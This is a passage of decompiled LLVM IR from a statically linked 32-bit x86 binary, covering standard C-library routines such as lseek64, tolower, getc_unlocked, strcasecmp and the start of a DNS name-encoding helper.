  uselistorder i32 %v2_8057a29, { 1, 0 }
  uselistorder i32 %v1_8057a22, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057a2c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8057a17, { 1, 0 }
  uselistorder i32 %v0_8057a17, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8057a09, { 1, 0 }
  uselistorder i8* %v4_8057a82, { 1, 0 }
  uselistorder i32 %v4_8057ae5, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_80578a6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057881, { 1, 0 }
  uselistorder i32 %v1_8057864, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 5, { 20, 26, 27, 28, 0, 19, 10, 11, 21, 12, 30, 31, 2, 5, 29, 6, 22, 13, 7, 23, 8, 24, 14, 9, 25, 15, 16, 17, 3, 4, 18, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 9, 2, 19, 20, 5, 3, 6, 4, 7, 8 }
  uselistorder i32* @global_var_805f61c, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2 }
  uselistorder i32 10, { 24, 2, 35, 36, 37, 38, 39, 40, 3, 29, 30, 32, 31, 4, 8, 41, 9, 42, 11, 10, 25, 5, 13, 28, 33, 12, 43, 26, 0, 22, 23, 14, 15, 27, 21, 20, 19, 17, 18, 1, 34, 6, 44, 45, 16, 7 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 0 }
  uselistorder i32 44, { 11, 12, 13, 10, 14, 15, 16, 26, 17, 18, 9, 23, 25, 24, 20, 21, 22, 19, 2, 3, 4, 5, 1, 6, 7, 8, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 14, 4, 10, 5, 2, 16, 17, 0, 11, 7, 6, 3, 13, 8, 9, 18, 19, 20, 21, 1, 12 }
  uselistorder i32 -48, { 2, 3, 5, 1, 4, 0 }
  uselistorder i32 -32, { 17, 0, 1, 15, 16, 3, 2, 4, 5, 6, 10, 9, 8, 7, 11, 12, 13, 14 }
  uselistorder i32 32, { 72, 33, 73, 74, 32, 38, 75, 76, 77, 78, 79, 56, 80, 81, 82, 54, 55, 83, 30, 102, 39, 63, 70, 71, 66, 31, 1, 0, 2, 3, 57, 4, 64, 5, 6, 7, 8, 9, 10, 34, 84, 85, 35, 86, 87, 88, 89, 90, 91, 92, 11, 93, 94, 58, 100, 101, 99, 65, 67, 68, 13, 12, 45, 15, 14, 44, 17, 16, 46, 69, 42, 18, 59, 60, 19, 61, 36, 21, 20, 47, 23, 22, 48, 43, 40, 37, 49, 24, 25, 27, 26, 50, 52, 29, 28, 51, 95, 96, 97, 98, 53, 41, 62 }
  uselistorder i32* @ebp, { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 10, 11, 12, 1, 13, 14, 15, 4, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 2, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 184, 30, 31, 16, 17, 18, 35, 36, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 178, 174, 175, 176, 177, 3, 179, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 5, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 0, 141, 7, 8, 9, 32, 33, 34, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 6, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 153, 154, 155, 156, 157, 158, 159, 160, 180, 181, 185, 182, 183 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057b19, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8057af9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8057adf.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057a95, { 1, 0 }
  uselistorder label %dec_label_pc_8057a79, { 1, 0 }
  uselistorder label %dec_label_pc_8057a3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8057a03.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057a29, { 1, 0 }
  uselistorder label %dec_label_pc_80579f7, { 1, 0 }
  uselistorder label %dec_label_pc_80579e0, { 1, 0 }
  uselistorder label %dec_label_pc_80579e0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80579c9, { 1, 0 }
  uselistorder label %dec_label_pc_805798e, { 1, 0 }
  uselistorder label %dec_label_pc_80578e5, { 1, 0 }
  uselistorder label %dec_label_pc_8057875, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057b2a = load i32, i32* @ebx, align 4
  store i32 %v0_8057b2a, i32* %stack_var_-12, align 4
  %v2_8057b3e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057b3e, i32* %esi.global-to-local, align 4
  %v1_8057b55 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8057b55, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8057b55, -4095
  br i1 %tmp18, label %dec_label_pc_8057b6f, label %dec_label_pc_8057b61

dec_label_pc_8057b61:                             ; preds = %entry
  %v2_8057b42 = ashr i32 %arg3, 31
  %v1_8057b61 = call i32 @__errno_location(i32 %v2_8057b42)
  %v0_8057b66 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057b66 = sub i32 0, %v0_8057b66
  %v2_8057b68 = inttoptr i32 %v1_8057b61 to i32*
  store i32 %v1_8057b66, i32* %v2_8057b68, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8057b83.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8057b73

dec_label_pc_8057b6f:                             ; preds = %entry
  %v1_8057b6f = icmp eq i32 %v1_8057b55, 0
  br i1 %v1_8057b6f, label %dec_label_pc_8057b78, label %dec_label_pc_8057b73

dec_label_pc_8057b73:                             ; preds = %dec_label_pc_8057b6f, %dec_label_pc_8057b61
  %v2_8057b83.pre = phi i32 [ %v0_8057b2a, %dec_label_pc_8057b6f ], [ %v2_8057b83.pre.pre, %dec_label_pc_8057b61 ]
  %v0_8057b73 = phi i32 [ %v1_8057b55, %dec_label_pc_8057b6f ], [ -1, %dec_label_pc_8057b61 ]
  %v1_8057b75 = ashr i32 %v0_8057b73, 31
  br label %dec_label_pc_8057b80

dec_label_pc_8057b78:                             ; preds = %dec_label_pc_8057b6f
  %v3_8057b78 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8057b80

dec_label_pc_8057b80:                             ; preds = %dec_label_pc_8057b73, %dec_label_pc_8057b78
  %v2_8057b83 = phi i32 [ %v2_8057b83.pre, %dec_label_pc_8057b73 ], [ %v0_8057b2a, %dec_label_pc_8057b78 ]
  %v0_8057b86 = phi i32 [ %v0_8057b73, %dec_label_pc_8057b73 ], [ %v3_8057b78, %dec_label_pc_8057b78 ]
  %storemerge = phi i32 [ %v1_8057b75, %dec_label_pc_8057b73 ], [ %tmp, %dec_label_pc_8057b78 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_8057b83, i32* @ebx, align 4
  ret i32 %v0_8057b86

; uselistorder directives
  uselistorder i32 %v1_8057b55, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8057b2a, { 1, 0, 2 }
  uselistorder i32 31, { 31, 32, 16, 33, 34, 35, 36, 37, 38, 12, 2, 3, 0, 1, 11, 22, 17, 18, 19, 6, 7, 4, 5, 13, 8, 9, 39, 40, 20, 14, 15, 21, 23, 24, 25, 10, 26, 27, 28, 29, 30 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057b80, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8057b8c = add i32 %arg1, 128
  %v6_8057b97 = icmp ugt i32 %v1_8057b8c, 383
  br i1 %v6_8057b97, label %dec_label_pc_8057ba2, label %dec_label_pc_8057b99

dec_label_pc_8057b99:                             ; preds = %entry
  %v0_8057b99 = load i32, i32* bitcast (i32** @global_var_805f880.938 to i32*), align 128
  %v2_8057b9e = mul i32 %arg1, 2
  %v3_8057b9e = add i32 %v0_8057b99, %v2_8057b9e
  %v4_8057b9e = inttoptr i32 %v3_8057b9e to i16*
  %v5_8057b9e = load i16, i16* %v4_8057b9e, align 2
  %v6_8057b9e = sext i16 %v5_8057b9e to i32
  store i32 %v6_8057b9e, i32* @edx, align 4
  br label %dec_label_pc_8057ba2

dec_label_pc_8057ba2:                             ; preds = %entry, %dec_label_pc_8057b99
  %v0_8057ba2 = phi i32 [ %arg1, %entry ], [ %v6_8057b9e, %dec_label_pc_8057b99 ]
  ret i32 %v0_8057ba2

; uselistorder directives
  uselistorder label %dec_label_pc_8057ba2, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_5()
  %stack_var_-5 = alloca i8, align 1
  %v0_8057ba8 = load i32, i32* @ebx, align 4
  %v4_8057bac = ptrtoint i16* %tmp to i32
  store i32 %v4_8057bac, i32* @ebx, align 4
  %v1_8057bb0 = add i32 %v4_8057bac, 16
  %v2_8057bb0 = inttoptr i32 %v1_8057bb0 to i32*
  %v3_8057bb0 = load i32, i32* %v2_8057bb0, align 4
  %v2_8057bb3 = add i32 %v4_8057bac, 24
  %v3_8057bb3 = inttoptr i32 %v2_8057bb3 to i32*
  %v4_8057bb3 = load i32, i32* %v3_8057bb3, align 4
  %v10_8057bb3 = icmp ult i32 %v3_8057bb0, %v4_8057bb3
  br i1 %v10_8057bb3, label %dec_label_pc_8057c55, label %dec_label_pc_8057bbc

dec_label_pc_8057bbc:                             ; preds = %entry
  %v2_8057bbc = load i16, i16* %tmp, align 2
  %v3_8057bbc = zext i16 %v2_8057bbc to i32
  %v1_8057bbf = and i32 %v3_8057bbc, 131
  %v6_8057bc9 = icmp ugt i32 %v1_8057bbf, 128
  br i1 %v6_8057bc9, label %dec_label_pc_8057be3, label %dec_label_pc_8057bcb

dec_label_pc_8057bcb:                             ; preds = %dec_label_pc_8057bbc
  %v0_8057bcb = load i32, i32* @edx, align 4
  %v6_8057bd3 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8057bcb, i32 %v0_8057bcb)
  %v1_8057bdb = icmp eq i32 %v6_8057bd3, 0
  %v1_8057bdd = icmp eq i1 %v1_8057bdb, false
  br i1 %v1_8057bdd, label %dec_label_pc_8057c7a, label %dec_label_pc_8057bcb.dec_label_pc_8057be3_crit_edge

dec_label_pc_8057bcb.dec_label_pc_8057be3_crit_edge: ; preds = %dec_label_pc_8057bcb
  %v0_8057be3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057be3

dec_label_pc_8057be3:                             ; preds = %dec_label_pc_8057bcb.dec_label_pc_8057be3_crit_edge, %dec_label_pc_8057bbc
  %v2_8057c17 = phi i32 [ %v0_8057be3.pre, %dec_label_pc_8057bcb.dec_label_pc_8057be3_crit_edge ], [ %v4_8057bac, %dec_label_pc_8057bbc ]
  %v1_8057be3 = inttoptr i32 %v2_8057c17 to i32*
  %v2_8057be3 = load i32, i32* %v1_8057be3, align 4
  store i32 %v2_8057be3, i32* @ecx, align 4
  %v1_8057be5 = urem i32 %v2_8057be3, 65536
  store i32 %v1_8057be5, i32* %edx.global-to-local, align 4
  %v2_8057be8 = and i32 %v2_8057be3, 2
  %v3_8057be8 = icmp eq i32 %v2_8057be8, 0
  br i1 %v3_8057be8, label %dec_label_pc_8057c06, label %dec_label_pc_8057bed

dec_label_pc_8057bed:                             ; preds = %dec_label_pc_8057be3
  %v1_8057bed = urem i32 %v2_8057be3, 2
  store i32 %v1_8057bed, i32* %edx.global-to-local, align 4
  %v1_8057bf0 = add i32 %v2_8057be3, 65535
  %v1_8057bf3 = trunc i32 %v1_8057bf0 to i16
  %v3_8057bf3 = inttoptr i32 %v2_8057c17 to i16*
  store i16 %v1_8057bf3, i16* %v3_8057bf3, align 2
  %v0_8057bf6 = load i32, i32* @ebx, align 4
  %v1_8057bf6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057bf6 = mul i32 %v1_8057bf6, 4
  %v3_8057bf6 = add i32 %v0_8057bf6, 36
  %v4_8057bf6 = add i32 %v3_8057bf6, %v2_8057bf6
  %v5_8057bf6 = inttoptr i32 %v4_8057bf6 to i8*
  %v6_8057bf6 = load i8, i8* %v5_8057bf6, align 1
  %v7_8057bf6 = zext i8 %v6_8057bf6 to i32
  %v9_8057bf6 = and i32 %v1_8057bf6, -256
  %v10_8057bf6 = or i32 %v7_8057bf6, %v9_8057bf6
  store i32 %v10_8057bf6, i32* %edx.global-to-local, align 4
  %v1_8057bfa = add i32 %v0_8057bf6, 40
  %v2_8057bfa = inttoptr i32 %v1_8057bfa to i32*
  store i32 0, i32* %v2_8057bfa, align 4
  %v0_8057c01 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057c01 = urem i32 %v0_8057c01, 256
  store i32 %v1_8057c01, i32* @edx, align 4
  br label %dec_label_pc_8057c7d

dec_label_pc_8057c06:                             ; preds = %dec_label_pc_8057be3
  %v1_8057c06 = add i32 %v2_8057c17, 16
  %v2_8057c06 = inttoptr i32 %v1_8057c06 to i32*
  %v3_8057c06 = load i32, i32* %v2_8057c06, align 4
  store i32 %v3_8057c06, i32* @eax, align 4
  %v1_8057c09 = add i32 %v2_8057c17, 20
  %v2_8057c09 = inttoptr i32 %v1_8057c09 to i32*
  %v3_8057c09 = load i32, i32* %v2_8057c09, align 4
  %v15_8057c09 = icmp eq i32 %v3_8057c09, %v3_8057c06
  %v1_8057c0c = icmp eq i1 %v15_8057c09, false
  br i1 %v1_8057c0c, label %dec_label_pc_8057c55, label %dec_label_pc_8057c0e

dec_label_pc_8057c0e:                             ; preds = %dec_label_pc_8057c06
  %v1_8057c0e = add i32 %v2_8057c17, 4
  %v2_8057c0e = inttoptr i32 %v1_8057c0e to i32*
  %v3_8057c0e = load i32, i32* %v2_8057c0e, align 4
  %v13_8057c0e = icmp eq i32 %v3_8057c0e, -2
  %v1_8057c12 = icmp eq i1 %v13_8057c0e, false
  br i1 %v1_8057c12, label %dec_label_pc_8057c1c, label %dec_label_pc_8057c14

dec_label_pc_8057c14:                             ; preds = %dec_label_pc_8057c0e
  %v1_8057c14 = or i32 %v2_8057be3, 4
  store i32 %v1_8057c14, i32* @ecx, align 4
  %v1_8057c17 = trunc i32 %v1_8057c14 to i16
  %v3_8057c17 = inttoptr i32 %v2_8057c17 to i16*
  store i16 %v1_8057c17, i16* %v3_8057c17, align 2
  br label %dec_label_pc_8057c7a

dec_label_pc_8057c1c:                             ; preds = %dec_label_pc_8057c0e
  %v1_8057c1c = udiv i32 %v2_8057be3, 256
  %v2_8057c1c = trunc i32 %v1_8057c1c to i8
  %v3_8057c1c = urem i8 %v2_8057c1c, 4
  %v4_8057c1c = icmp eq i8 %v3_8057c1c, 0
  %v8_8057c1c = zext i8 %v3_8057c1c to i32
  %v10_8057c1c = mul nuw nsw i32 %v8_8057c1c, 256
  %v11_8057c1c = urem i32 %v2_8057be3, 256
  %v12_8057c1c = or i32 %v10_8057c1c, %v11_8057c1c
  store i32 %v12_8057c1c, i32* %edx.global-to-local, align 4
  br i1 %v4_8057c1c, label %dec_label_pc_8057c31, label %dec_label_pc_8057c21

dec_label_pc_8057c21:                             ; preds = %dec_label_pc_8057c1c
  %v3_8057c29 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805f63c.924 to i16*))
  %v0_8057c31.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057c31

dec_label_pc_8057c31:                             ; preds = %dec_label_pc_8057c1c, %dec_label_pc_8057c21
  %v0_8057c66 = phi i32 [ %v2_8057c17, %dec_label_pc_8057c1c ], [ %v0_8057c31.pre, %dec_label_pc_8057c21 ]
  %v1_8057c31 = add i32 %v0_8057c66, 8
  %v2_8057c31 = inttoptr i32 %v1_8057c31 to i32*
  %v3_8057c31 = load i32, i32* %v2_8057c31, align 4
  %v1_8057c34 = add i32 %v0_8057c66, 12
  %v2_8057c34 = inttoptr i32 %v1_8057c34 to i32*
  %v3_8057c34 = load i32, i32* %v2_8057c34, align 4
  %v15_8057c34 = icmp eq i32 %v3_8057c34, %v3_8057c31
  br i1 %v15_8057c34, label %dec_label_pc_8057c5e, label %dec_label_pc_8057c39

dec_label_pc_8057c39:                             ; preds = %dec_label_pc_8057c31
  %v2_8057c3c = add i32 %v0_8057c66, 24
  %v3_8057c3c = inttoptr i32 %v2_8057c3c to i32*
  store i32 %v3_8057c31, i32* %v3_8057c3c, align 4
  %v0_8057c3f = load i32, i32* @ebx, align 4
  %v2_8057c40 = call i32 @__stdio_rfill(i32 %v0_8057c3f)
  %v1_8057c48 = icmp eq i32 %v2_8057c40, 0
  br i1 %v1_8057c48, label %dec_label_pc_8057c7a, label %dec_label_pc_8057c4c

dec_label_pc_8057c4c:                             ; preds = %dec_label_pc_8057c39
  %v0_8057c4c = load i32, i32* @ebx, align 4
  %v1_8057c4c = add i32 %v0_8057c4c, 20
  %v2_8057c4c = inttoptr i32 %v1_8057c4c to i32*
  %v3_8057c4c = load i32, i32* %v2_8057c4c, align 4
  %v2_8057c4f = add i32 %v0_8057c4c, 24
  %v3_8057c4f = inttoptr i32 %v2_8057c4f to i32*
  store i32 %v3_8057c4c, i32* %v3_8057c4f, align 4
  %v0_8057c52 = load i32, i32* @ebx, align 4
  %v1_8057c52 = add i32 %v0_8057c52, 16
  %v2_8057c52 = inttoptr i32 %v1_8057c52 to i32*
  %v3_8057c52 = load i32, i32* %v2_8057c52, align 4
  br label %dec_label_pc_8057c55

dec_label_pc_8057c55:                             ; preds = %dec_label_pc_8057c06, %entry, %dec_label_pc_8057c4c
  %v1_8057c59 = phi i32 [ %v2_8057c17, %dec_label_pc_8057c06 ], [ %v4_8057bac, %entry ], [ %v0_8057c52, %dec_label_pc_8057c4c ]
  %v0_8057c55 = phi i32 [ %v3_8057c06, %dec_label_pc_8057c06 ], [ %v3_8057bb0, %entry ], [ %v3_8057c52, %dec_label_pc_8057c4c ]
  %v1_8057c55 = inttoptr i32 %v0_8057c55 to i8*
  %v2_8057c55 = load i8, i8* %v1_8057c55, align 1
  %v3_8057c55 = zext i8 %v2_8057c55 to i32
  store i32 %v3_8057c55, i32* @edx, align 4
  %v1_8057c58 = add i32 %v0_8057c55, 1
  %v2_8057c59 = add i32 %v1_8057c59, 16
  %v3_8057c59 = inttoptr i32 %v2_8057c59 to i32*
  store i32 %v1_8057c58, i32* %v3_8057c59, align 4
  %v0_8057c7d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057c7d

dec_label_pc_8057c5e:                             ; preds = %dec_label_pc_8057c31
  %v2_8057c61 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8057c66 = inttoptr i32 %v0_8057c66 to i16*
  %v5_8057c67 = call i32 @__stdio_READ(i16* %v5_8057c66, i32 %v2_8057c61, i32 1)
  %v1_8057c6f = icmp eq i32 %v5_8057c67, 0
  br i1 %v1_8057c6f, label %dec_label_pc_8057c7a, label %dec_label_pc_8057c73

dec_label_pc_8057c73:                             ; preds = %dec_label_pc_8057c5e
  %v3_8057c73 = load i8, i8* %stack_var_-5, align 1
  %v4_8057c73 = sext i8 %v3_8057c73 to i32
  store i32 %v4_8057c73, i32* @edx, align 4
  br label %dec_label_pc_8057c7d

dec_label_pc_8057c7a:                             ; preds = %dec_label_pc_8057c5e, %dec_label_pc_8057c39, %dec_label_pc_8057bcb, %dec_label_pc_8057c14
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8057c7d

dec_label_pc_8057c7d:                             ; preds = %dec_label_pc_8057c73, %dec_label_pc_8057c55, %dec_label_pc_8057bed, %dec_label_pc_8057c7a
  %v0_8057c7d = phi i32 [ %v4_8057c73, %dec_label_pc_8057c73 ], [ %v0_8057c7d.pre, %dec_label_pc_8057c55 ], [ %v1_8057c01, %dec_label_pc_8057bed ], [ -1, %dec_label_pc_8057c7a ]
  store i32 %v0_8057ba8, i32* @ebx, align 4
  ret i32 %v0_8057c7d

; uselistorder directives
  uselistorder i32 %v0_8057c55, { 1, 0 }
  uselistorder i32 %v3_8057c31, { 1, 0 }
  uselistorder i32 %v0_8057c66, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8057c1c, { 1, 0 }
  uselistorder i32 %v3_8057c06, { 1, 0, 2 }
  uselistorder i32 %v1_8057c01, { 1, 0 }
  uselistorder i32 %v2_8057be3, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8057c17, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32* @global_var_805f680.917, { 1, 2, 0 }
  uselistorder i32 -2, { 0, 2, 7, 16, 17, 1, 15, 19, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 13, 6, 14 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 9, 10, 1, 2, 11, 12, 13, 14, 3, 0 }
  uselistorder i32 -256, { 92, 1, 93, 0, 94, 23, 24, 95, 96, 3, 63, 62, 2, 97, 98, 99, 100, 6, 101, 4, 102, 5, 103, 129, 8, 65, 64, 7, 104, 105, 106, 107, 108, 109, 110, 111, 138, 112, 37, 38, 39, 84, 139, 131, 132, 140, 87, 86, 9, 126, 127, 113, 114, 115, 116, 117, 10, 118, 119, 11, 120, 121, 122, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 17, 61, 18, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 20, 21, 22, 85, 19, 88, 89, 90, 91, 124, 123, 125, 128, 12, 130, 137, 134, 14, 135, 15, 136, 13, 133, 16 }
  uselistorder i32 36, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 3, 4, 18, 6, 19, 20, 21, 22, 5, 0, 1 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 128, { 7, 15, 18, 14, 16, 2, 3, 8, 9, 17, 4, 10, 11, 19, 0, 20, 21, 5, 1, 12, 22, 13, 6 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 6, 12, 21, 13, 31, 32, 33, 34, 35, 36, 37, 38, 3, 14, 15, 16, 17, 18, 19, 4, 5, 7, 8, 9, 10, 2, 11, 20, 1 }
  uselistorder label %dec_label_pc_8057c7d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057c7a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057c55, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057c31, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8057c86 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057c86, i32* @ecx, align 4
  %v0_8057c90 = load i32, i32* bitcast (i32** @global_var_805f880.938 to i32*), align 128
  br label %dec_label_pc_8057c96

dec_label_pc_8057c96:                             ; preds = %dec_label_pc_8057cb3, %entry
  %v0_8057cb96 = phi i32 [ %v0_8057cb97, %dec_label_pc_8057cb3 ], [ 0, %entry ]
  %v0_8057cb3 = phi i32 [ %v1_8057cb3, %dec_label_pc_8057cb3 ], [ %arg2, %entry ]
  %v0_8057cb4 = phi i32 [ %v1_8057cb4, %dec_label_pc_8057cb3 ], [ %v4_8057c86, %entry ]
  %v12_8057c96 = icmp eq i32 %v0_8057cb4, %v0_8057cb3
  %.pre = inttoptr i32 %v0_8057cb4 to i8*
  br i1 %v12_8057c96, label %dec_label_pc_8057cae, label %dec_label_pc_8057c9a

dec_label_pc_8057c9a:                             ; preds = %dec_label_pc_8057c96
  %v2_8057c9a = load i8, i8* %.pre, align 1
  %v3_8057c9a = zext i8 %v2_8057c9a to i32
  %v2_8057c9d = mul nuw nsw i32 %v3_8057c9a, 2
  %v3_8057c9d = add i32 %v2_8057c9d, %v0_8057c90
  %v4_8057c9d = inttoptr i32 %v3_8057c9d to i16*
  %v5_8057c9d = load i16, i16* %v4_8057c9d, align 2
  %v6_8057c9d = sext i16 %v5_8057c9d to i32
  %v1_8057ca1 = inttoptr i32 %v0_8057cb3 to i8*
  %v2_8057ca1 = load i8, i8* %v1_8057ca1, align 1
  %v3_8057ca1 = zext i8 %v2_8057ca1 to i32
  %v2_8057ca4 = mul nuw nsw i32 %v3_8057ca1, 2
  %v3_8057ca4 = add i32 %v2_8057ca4, %v0_8057c90
  %v4_8057ca4 = inttoptr i32 %v3_8057ca4 to i16*
  %v5_8057ca4 = load i16, i16* %v4_8057ca4, align 2
  %v6_8057ca4 = sext i16 %v5_8057ca4 to i32
  %v2_8057ca8 = sub nsw i32 %v6_8057c9d, %v6_8057ca4
  %v12_8057ca8 = icmp eq i32 %v2_8057ca8, 0
  store i32 %v2_8057ca8, i32* @edx, align 4
  %v1_8057cac = icmp eq i1 %v12_8057ca8, false
  br i1 %v1_8057cac, label %dec_label_pc_8057cb7, label %dec_label_pc_8057cae

dec_label_pc_8057cae:                             ; preds = %dec_label_pc_8057c96, %dec_label_pc_8057c9a
  %v0_8057cb97 = phi i32 [ %v2_8057ca8, %dec_label_pc_8057c9a ], [ %v0_8057cb96, %dec_label_pc_8057c96 ]
  %v2_8057cae = load i8, i8* %.pre, align 1
  %v3_8057cae = icmp eq i8 %v2_8057cae, 0
  br i1 %v3_8057cae, label %dec_label_pc_8057cb7, label %dec_label_pc_8057cb3

dec_label_pc_8057cb3:                             ; preds = %dec_label_pc_8057cae
  %v1_8057cb3 = add i32 %v0_8057cb3, 1
  %v1_8057cb4 = add i32 %v0_8057cb4, 1
  store i32 %v1_8057cb4, i32* @ecx, align 4
  br label %dec_label_pc_8057c96

dec_label_pc_8057cb7:                             ; preds = %dec_label_pc_8057cae, %dec_label_pc_8057c9a
  %v0_8057cb9 = phi i32 [ %v0_8057cb97, %dec_label_pc_8057cae ], [ %v2_8057ca8, %dec_label_pc_8057c9a ]
  ret i32 %v0_8057cb9

; uselistorder directives
  uselistorder i32 %v1_8057cb4, { 1, 0 }
  uselistorder i32 %v0_8057cb97, { 1, 0 }
  uselistorder i32 %v2_8057ca8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057cb4, { 2, 1, 0 }
  uselistorder i32 %v0_8057cb3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057cae, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8057cbd = load i32, i32* @edi, align 4
  %v0_8057cbe = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8057cc5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057cc5, i32* @edi, align 4
  %v1_8057d246 = icmp eq i8* %arg1, null
  br i1 %v1_8057d246, label %dec_label_pc_8057d2d, label %dec_label_pc_8057d28.lr.ph

dec_label_pc_8057d28.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057d28

dec_label_pc_8057ccb:                             ; preds = %dec_label_pc_8057d28
  %v5_8057cd0 = call i32 @__GI_strchr(i8* %v1_8057d28, i32 46)
  %v1_8057cda = icmp eq i32 %v5_8057cd0, 0
  br i1 %v1_8057cda, label %dec_label_pc_8057ce4, label %dec_label_pc_8057cde

